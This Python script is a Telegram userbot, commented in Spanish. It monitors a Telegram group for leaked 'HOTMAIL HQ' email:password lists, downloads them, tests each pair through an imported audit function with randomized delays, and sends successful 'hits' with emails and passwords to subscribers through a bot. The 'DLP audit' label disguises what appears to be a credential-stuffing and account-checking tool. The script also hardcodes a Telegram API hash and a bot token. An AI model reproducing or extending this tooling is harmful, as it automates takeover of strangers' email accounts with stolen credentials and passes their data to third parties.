import os
import sys
import time
import threading
import base64
import requests
import asyncio
import random
import json
from urllib.parse import urlparse

try:
    from telethon import TelegramClient, events
except ImportError:
    print("❌ Error: Telethon no está instalado. Ejecuta 'pip install telethon'")
    sys.exit(1)

# ══════════════════════════════════════════════════
# CONFIGURATION
# ══════════════════════════════════════════════════
# Credenciales del Usuario
API_ID = 23099503
API_HASH = "5980c7a831a590bd1e3b58648ce1e1e2"

# Session name (creates a polar_bot.session file to keep you logged in)
SESSION_NAME = "polar_bot"

# ── Render Deployment: Load session from env var if available ──
SESSION_B64 = os.environ.get("SESSION_B64", "")
if SESSION_B64:
    print("🔑 Cargando sesión desde variable de entorno SESSION_B64...")
    try:
        session_bytes = base64.b64decode(SESSION_B64)
        with open(f"{SESSION_NAME}.session", "wb") as sf:
            sf.write(session_bytes)
        print(f"✅ Sesión escrita en {SESSION_NAME}.session ({len(session_bytes)} bytes)")
    except Exception as e:
        print(f"⚠️ Error decodificando sesión: {e}")

DOWNLOAD_DIR = "incoming_targets"

if not os.path.exists(DOWNLOAD_DIR):
    os.makedirs(DOWNLOAD_DIR)

client = TelegramClient(SESSION_NAME, API_ID, API_HASH)


# =======================================================
# DLP SCANNER INTEGRATION
# =======================================================
class DummyQueue:
    def put(self, item):
        try:
            msg = json.loads(item)
            if msg['type'] == 'info':
                print(f"   ℹ️ {msg.get('message', '')}")
            elif msg['type'] in ['step_start', 'step_pass', 'step_fail']:
                pass # Too verbose for logs
            elif msg['type'] == 'done':
                print(f"   🏁 Clasificación: {msg.get('classification', '???')}")
        except:
            pass

def process_file_and_scan(file_path, target_notif_chat=None, target_user_filter=None):
    print("📥 Archivo detectado. Iniciando Auditoría DLP automática...")
    hits_buffer = []
    
    # 1. Read file
    try:
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            creds_text = f.read()
    except Exception as e:
        print(f"❌ Error leyendo archivo: {e}")
        return
    
    # 2. Extract pairs
    raw_pairs = [line.strip() for line in creds_text.split('\n') if line.strip()]
    valid_creds = []
    for pair in raw_pairs:
        parts = pair.split(':')
        if len(parts) == 2:
            valid_creds.append(f"{parts[0]}:{parts[1]}")
    
    if not valid_creds:
        print("❌ Error: No se encontraron credenciales válidas.")
        return
        
    print(f"✅ Procesando {len(valid_creds)} objetivos en background...")
    
    # 3. Import and Trigger run_audit Headlessly
    sys.path.append(os.path.dirname(os.path.abspath(__file__)))
    try:
        from server import run_audit
    except ImportError as e:
        print(f"❌ Error importando DLP backend: {e}")
        return
        
    dummy_q = DummyQueue()
    
    for cred in valid_creds:
        email, pwd = cred.split(':', 1)
        try:
            # We pass multi_user=True, the hit_buffer and the user filter
            run_audit(dummy_q, email.strip(), pwd.strip(), multi_user=True, hit_buffer=hits_buffer, target_user_filter=target_user_filter)
        except Exception as e:
            print(f"Error scanning {email}: {e}")
        
        # 'Tiempo al tiempo' - delay between credentials
        time.sleep(random.uniform(0.5, 1.2))
            
    print(f"🏁 Auditoría de {len(valid_creds)} objetivos finalizada.")

    # 4. Consolidated Reporting
    if hits_buffer:
        print(f"📦 Enviando reporte consolidado de {len(hits_buffer)} HITs...")
        send_consolidated_report(hits_buffer)
    else:
        print("✅ No se encontraron HITs en este lote.")

def send_consolidated_report(hits):
    # Group by chat_id FIRST, so we send private reports to each user
    user_hits = {}
    for h in hits:
        cid = h['chat_id']
        if cid not in user_hits: user_hits[cid] = []
        user_hits[cid].append(h)
    
    token = "8741495811:AAEOFBaW9QfFOpVWfW6kyogJskS7y4wVTIs"

    for cid, u_hits in user_hits.items():
        # group by category for this user
        categories = {}
        for h in u_hits:
            cat = h['match']
            if cat not in categories: categories[cat] = []
            categories[cat].append(h)
        
        # 1. Create Summary Text
        summary_lines = ["📊 *REPORTE DE AUDITORÍA DLP* 📊", "━━━━━━━━━━━━━━━━━━"]
        for cat, items in categories.items():
            summary_lines.append(f"✅ *{cat}*: `{len(items)}` aciertos")
        summary_lines.append("\n📄 _Detalles completos en el archivo adjunto_")

        # 2. Create detailed TXT
        report_name = f"reporte_hits_{cid}_{int(time.time())}.txt"
        report_path = os.path.join("incoming_targets", report_name)
        
        with open(report_path, "w", encoding="utf-8") as f:
            f.write("DLP AUDIT PRO - REPORTE DE HITS\n")
            f.write("="*40 + "\n\n")
            
            f.write(f"{'CORREO':<30} | {'CONTRASEÑA':<15} | {'HITS':<6} | {'PAÍS':<4} | {'OBJETIVO'}\n")
            f.write("-" * 80 + "\n")
            for cat, items in categories.items():
                for h in items:
                    pwd = h['pass']
                    if len(pwd) > 15: pwd = pwd[:12] + "..."
                    f.write(f"{h['email']:<30} | {pwd:<15} | {str(h['total']):<6} | {h['country'][:4]:<4} | [{h['match']}]\n")
            f.write("\n")

        # 3. Send
        try:
            res_msg = requests.post(f"https://api.telegram.org/bot{token}/sendMessage", 
                          json={"chat_id": cid, "text": "\n".join(summary_lines), "parse_mode": "Markdown"})
            res_msg.raise_for_status()
            
            with open(report_path, "rb") as f:
                res_doc = requests.post(f"https://api.telegram.org/bot{token}/sendDocument",
                              data={"chat_id": cid},
                              files={"document": f})
                res_doc.raise_for_status()
        except requests.exceptions.HTTPError as he:
            print(f"❌ Error HTTP de Telegram para {cid}: {he.response.text}")
        except Exception as e:
            print(f"Error enviando reporte bot para {cid}: {e}")

def fire_and_forget_scan(file_path, target_user_filter=None):
    # This runs in a background thread, far away from Telethon's asyncio loop
    try:
        process_file_and_scan(file_path, "me", target_user_filter=target_user_filter)
    except Exception as e:
        print(f"Crit Error in Scanner Thread: {e}")

async def check_and_process_deep_scans():
    """Polls database for deep scan requests and processes them slowly."""
    print("⏳ Deep Scan Poller iniciado...")
    import server
    from server import get_db_conn, q
    
    while True:
        try:
            conn = get_db_conn()
            c = conn.cursor()
            c.execute(q("""
                SELECT id, username, last_msg_id, files_scanned 
                FROM scan_requests 
                WHERE status = 'pending'
                LIMIT 1
            """))
            job = c.fetchone()
            
            if job:
                job_id, username, last_msg_id, files_scanned = job
                print(f"🚀 Iniciando Deep Scan para: {username} (Desde: {last_msg_id or 'Principio'})")
                c.execute(q("UPDATE scan_requests SET status = 'processing' WHERE id = ?"), (job_id,))
                conn.commit()
                conn.close()
                
                try:
                    await run_historic_crawl(job_id, username, last_msg_id, files_scanned)
                    
                    conn = get_db_conn()
                    c = conn.cursor()
                    c.execute(q("UPDATE scan_requests SET status = 'completed' WHERE id = ?"), (job_id,))
                    conn.commit()
                    conn.close()
                    print(f"✅ Deep Scan completado para: {username}")
                except Exception as e:
                    print(f"❌ Error en Deep Scan ({username}): {e}")
                    conn = get_db_conn()
                    c = conn.cursor()
                    c.execute(q("UPDATE scan_requests SET status = 'failed' WHERE id = ?"), (job_id,))
                    conn.commit()
                    conn.close()
            else:
                conn.close()
        except Exception as e:
            print(f"Error poll scan_jobs: {e}")
            
        await asyncio.sleep(60) # Poll every minute

async def run_historic_crawl(job_id, username, last_msg_id, start_count):
    """Crawls history, downloads HOTMAIL HQ files and scans them for a specific user."""
    from server import get_db_conn, q
    # Ensure client is connected
    if not client.is_connected():
        await client.connect()
        
    target_chat = None
    async for dialog in client.iter_dialogs():
        if TARGET_GROUP.lower() in dialog.name.lower():
            target_chat = dialog.entity
            break
            
    if not target_chat:
        raise Exception(f"Grupo '{TARGET_GROUP}' no encontrado")

    print(f"📑 Crawleando historia en '{TARGET_GROUP}' para '{username}'...")
    
    files_found = start_count or 0
    # Iterar sobre TODO el historial. Si hay last_msg_id, empezamos desde ahí.
    async for msg in client.iter_messages(target_chat, limit=None, offset_id=last_msg_id if last_msg_id else 0):
        # 1. Verificar si el usuario pausó el proceso
        conn = get_db_conn()
        cur = conn.cursor()
        cur.execute(q("SELECT status FROM scan_requests WHERE id = ?"), (job_id,))
        status_row = cur.fetchone()
        conn.close()
        
        if status_row and status_row[0] == 'paused':
            print(f"⏸️ Deep Scan PAUSADO por el usuario: {username}")
            return # Salimos del loop pero el status se queda en 'paused'

        if msg.document or msg.file:
            fname = getattr(msg.file, 'name', '') or 'list.txt'
            # Solo archivos HOTMAIL HQ (independiente de mayúsculas/minúsculas)
            if "hotmail hq" in fname.lower() or "hotmail hq" in (msg.message or "").lower():
                files_found += 1
                
                # CACHE LOGIC: Deterministic filename using Message ID
                cache_name = f"hq_{msg.id}_{fname}"
                local_path = os.path.join(DOWNLOAD_DIR, cache_name)
                
                if os.path.exists(local_path):
                    print(f"   ♻️  Usando caché: {cache_name}")
                else:
                    print(f"   📥 [{files_found}] Descargando: {fname}")
                    await msg.download_media(local_path)
                
                # Procesar el archivo
                process_file_and_scan(local_path, target_user_filter=username)
                
                # 2. Guardar progreso parcial
                conn = get_db_conn()
                cur = conn.cursor()
                cur.execute(q("UPDATE scan_requests SET last_msg_id = ?, files_scanned = ? WHERE id = ?"), 
                            (msg.id, files_found, job_id))
                conn.commit()
                conn.close()

                # 'Tiempo al tiempo' - delay entre archivos históricos
                print(f"   ⏳ Esperando entre archivos...")
                await asyncio.sleep(random.uniform(10, 20))
                
    print(f"🏁 Finalizado crawl de historia. Se procesaron {files_found} archivos para {username}.")

# =======================================================
# TELEGRAM EVENTS
# =======================================================
# =======================================================
TARGET_GROUP = "" # We'll set this dynamically
FILTER_KEYWORD = "" # We'll allow the user to set a keyword (e.g., 'HOTMAIL HQ')

@client.on(events.NewMessage)
async def handler(event):
    if not TARGET_GROUP:
        return
        
    # We only care about the target group
    chat = await event.get_chat()
    try:
        chat_id_or_title = getattr(chat, 'title', str(chat.id))
    except:
        chat_id_or_title = str(chat.id)

    # Check if this chat matches the user's TARGET_GROUP string
    chat_username_lower = getattr(chat, 'username', '').lower() if getattr(chat, 'username', '') else ""
    if TARGET_GROUP.lower() not in chat_id_or_title.lower() and TARGET_GROUP.lower() not in chat_username_lower and TARGET_GROUP != str(chat.id):
        return

    # Filter Keyword Check
    if FILTER_KEYWORD:
        msg_text = getattr(event.message, 'message', '') or ''
        has_keyword_in_text = FILTER_KEYWORD.lower() in msg_text.lower()
    else:
        has_keyword_in_text = True 

    # Check if message has a document
    if event.message.document:
        doc = event.message.document
        mime = doc.mime_type
        # Telegram files usually have attributes where the filename is stored
        file_name = ""
        for attr in doc.attributes:
            if hasattr(attr, 'file_name'):
                file_name = attr.file_name
                break
                
        if mime == 'text/plain' or file_name.lower().endswith('.txt'):
            # Combine text and filename check for the filter
            if FILTER_KEYWORD and not (has_keyword_in_text or FILTER_KEYWORD.lower() in file_name.lower()):
                print(f"[-] Ignorando archivo '{file_name}' porque no contiene '{FILTER_KEYWORD}'")
                return
                
            print(f"[*] ¡Documento .txt detectado en {TARGET_GROUP}!")
            try:
                # Save to incoming_targets
                local_path = os.path.join(DOWNLOAD_DIR, f"{int(time.time())}_{file_name if file_name else 'lista.txt'}")
                print(f"    -> Descargando...")
                await client.download_media(event.message, file=local_path)
                print(f"    -> Guardado en {local_path}. Iniciando escáner...")
                
                # Run scanner in a separate thread to not block Telethon
                t = threading.Thread(target=fire_and_forget_scan, args=(local_path,))
                t.start()
            except Exception as e:
                print(f"Error descargando medio: {e}")

async def main():
    print("══════════════════════════════════════════════════")
    print("  👁️  TELETHON USERBOT LISTENER                   ")
    print("══════════════════════════════════════════════════")
    
    # Conectar sin prompts interactivos (especial para Render/servidores headless)
    await client.connect()
    
    if not await client.is_user_authorized():
        print("❌ La sesión NO es válida o expiró.")
        print("   Por favor vuelve a autenticarte localmente y actualiza SESSION_B64 en Render.")
        print("   -> El sistema de escucha de archivos se pausará hasta que actualices la variable.")
        while True:
            await asyncio.sleep(300)
            print("⏳ Esperando nueva SESSION_B64... Actualiza en Render y reinicia el servicio manual.")
    
    print("\n✅ ¡Sesión iniciada correctamente!")

    
    global TARGET_GROUP, FILTER_KEYWORD
    
    # Read from ENV VARS if available (for Render deployment), else fall back to input()
    TARGET_GROUP = os.environ.get("TARGET_GROUP", "").strip()
    if not TARGET_GROUP:
        print("❌ ERROR: No se ha definido 'TARGET_GROUP' en las variables de entorno.")
        return

    # Extraer username si pusieron un link (ej. https://t.me/mi_grupo)
    if not TARGET_GROUP.replace('-','').isdigit():
        parsed = urlparse(TARGET_GROUP)
        if parsed.path and parsed.netloc:  # it's a real URL
            TARGET_GROUP = parsed.path.strip('/')
    
    FILTER_KEYWORD = os.environ.get("FILTER_KEYWORD", "HOTMAIL HQ").strip()
    
    print(f"\n📡 Escuchando 24/7 nuevos envíos .txt en: '{TARGET_GROUP}'")
    if FILTER_KEYWORD:
        print(f"🔍 FILTRO ACTIVO: Solo descargará archivos que digan '{FILTER_KEYWORD}'")
    print("Los HITS positivos se enviarán al Telegram de cada usuario registrado.")
    
    # Iniciar poller de Deep Scan en el mismo loop
    asyncio.create_task(check_and_process_deep_scans())
    
    await client.run_until_disconnected()


import asyncio

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nSaliendo...")
